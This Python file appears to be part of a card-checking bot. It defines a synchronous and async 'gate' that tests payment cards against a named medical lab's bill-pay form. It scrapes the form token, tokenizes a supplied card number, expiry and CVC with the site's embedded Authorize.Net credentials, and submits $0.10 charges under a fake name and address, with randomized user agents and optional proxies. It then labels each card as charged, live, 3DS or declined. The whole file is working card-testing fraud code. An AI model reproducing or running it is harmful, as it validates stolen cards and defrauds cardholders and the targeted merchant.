import requests
import json
import re
import uuid
import random
import string
import asyncio

def check_card_authorize_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous Authorize.Net Accept.js WPForms Charge Gate ($0.10).
    Target: https://avanticmedicallab.com/pay-bill-online/
    """
    if len(yy) == 2:
        yy_full = f"20{yy}"
        yy_short = yy
    else:
        yy_full = yy
        yy_short = yy[-2:]

    exp_date = f"{mm.zfill(2)}{yy_short}"

    s = requests.Session()
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36"
    s.headers.update({'User-Agent': user_agent})

    if proxy_url:
        s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Step 1: GET page to fetch dynamic WPForms Token
        r_page = s.get('https://avanticmedicallab.com/pay-bill-online/', timeout=15)
        token_match = re.search(r'name="wpforms\[token\]" value="([^"]+)"', r_page.text)
        wp_token = token_match.group(1) if token_match else 'ccf1f214e6ae1c99c9bf26c60650bd7f'

        # Step 2: Tokenize card via Authorize.Net Accept.js API
        api_headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/',
            'User-Agent': user_agent
        }

        tok_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '3c5Q9QdJW',
                    'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': str(uuid.uuid4()),
                    'token': {
                        'cardNumber': cc,
                        'expirationDate': exp_date,
                        'cardCode': cvc,
                    },
                },
            },
        }

        r_tok = s.post('https://api2.authorize.net/xml/v1/request.api', headers=api_headers, json=tok_data, timeout=15)
        tok_clean = r_tok.content.decode('utf-8-sig', errors='ignore')
        tok_json = json.loads(tok_clean)

        if 'opaqueData' not in tok_json:
            messages = tok_json.get('messages', {}).get('message', [{}])
            err_msg = messages[0].get('text', 'Tokenization Failed') if isinstance(messages, list) and len(messages) > 0 else 'Tokenization Failed'
            return "declined", err_msg, "N/A"

        opaque_descriptor = tok_json['opaqueData'].get('dataDescriptor', 'COMMON.ACCEPT.INAPP.PAYMENT')
        opaque_value = tok_json['opaqueData'].get('dataValue')

        # Step 3: Submit checkout via WPForms AJAX
        ajax_headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
            'User-Agent': user_agent,
            'X-Requested-With': 'XMLHttpRequest',
        }

        first_name = "Alex"
        last_name = "Morgan"
        email = f"alex{random.randint(1000,9999)}@gmail.com"

        files = {
            'wpforms[fields][1][first]': (None, first_name),
            'wpforms[fields][1][last]': (None, last_name),
            'wpforms[fields][17]': (None, '0.10'),
            'wpforms[fields][2]': (None, email),
            'wpforms[fields][3]': (None, '(315) 424-8967'),
            'wpforms[fields][14]': (None, ''),
            'wpforms[fields][4][address1]': (None, '100 Main St'),
            'wpforms[fields][4][city]': (None, 'New York'),
            'wpforms[fields][4][state]': (None, 'NY'),
            'wpforms[fields][4][postal]': (None, '10001'),
            'wpforms[fields][6]': (None, '$ 0.10'),
            'wpforms[fields][11][]': (None, 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.'),
            'wpforms[id]': (None, '4449'),
            'wpforms[author]': (None, '1'),
            'wpforms[post_id]': (None, '3388'),
            'wpforms[authorize_net][opaque_data][descriptor]': (None, opaque_descriptor),
            'wpforms[authorize_net][opaque_data][value]': (None, opaque_value),
            'wpforms[authorize_net][card_data][expire]': (None, f"{mm.zfill(2)}/{yy_short}"),
            'wpforms[token]': (None, wp_token),
            'action': (None, 'wpforms_submit'),
            'page_url': (None, 'https://avanticmedicallab.com/pay-bill-online/'),
            'page_title': (None, 'Pay Bill Online'),
            'page_id': (None, '3388'),
        }

        r_sub = s.post('https://avanticmedicallab.com/wp-admin/admin-ajax.php', headers=ajax_headers, files=files, timeout=20)
        res_text = r_sub.text

        try:
            res_json = r_sub.json()
            if res_json.get('success'):
                data_msg = res_json.get('data', {})
                msg_str = str(data_msg)
                return "charged", "Charge Successful ($0.10)", "N/A"
            else:
                data_err = res_json.get('data', {})
                err_str = str(data_err)
                if isinstance(data_err, dict) and 'errors' in data_err:
                    err_str = str(data_err['errors'])
                
                err_lower = err_str.lower()
                if "insufficient" in err_lower or "funds" in err_lower:
                    return "live", "Insufficient Funds", "N/A"
                elif "cvv" in err_lower or "cvc" in err_lower or "card code" in err_lower:
                    return "live", "CVV Mismatch", "N/A"
                elif "3d" in err_lower or "verification" in err_lower:
                    return "3ds", "3D Secure / Verification Required", "N/A"
                else:
                    return "declined", err_str[:120], "N/A"
        except Exception:
            err_lower = res_text.lower()
            if "thank you" in err_lower or "success" in err_lower:
                return "charged", "Charge Successful ($0.10)", "N/A"
            elif "insufficient" in err_lower:
                return "live", "Insufficient Funds", "N/A"
            elif "3d" in err_lower or "verification" in err_lower:
                return "3ds", "3D Secure / Verification Required", "N/A"
            else:
                return "declined", res_text[:120] if res_text else "Declined", "N/A"

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_authorize(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_authorize_sync.
    """
    return await asyncio.to_thread(check_card_authorize_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
